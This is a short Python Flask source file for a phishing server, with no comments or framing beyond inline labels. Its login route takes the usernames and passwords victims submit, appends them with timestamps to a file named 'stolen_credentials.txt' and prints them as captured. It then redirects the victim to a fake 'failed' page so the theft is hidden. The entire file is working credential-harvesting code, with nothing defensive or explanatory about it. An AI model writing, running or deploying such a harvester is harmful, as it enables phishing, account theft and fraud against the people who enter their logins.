from flask import Flask, render_template, request, redirect, url_for
import datetime

app = Flask(__name__)

# Route for the login page
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Save credentials
        with open('stolen_credentials.txt', 'a') as f:
            f.write(f"[{datetime.datetime.now()}] Username: {username} | Password: {password}\n")

        print(f"\n[+] Captured Credentials => Username: {username} | Password: {password}\n")

        # Redirect to failed page
        return redirect(url_for('failed'))

    return render_template('login.html')

# Route for the failed login
@app.route('/failed')
def failed():
    return render_template('failed.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
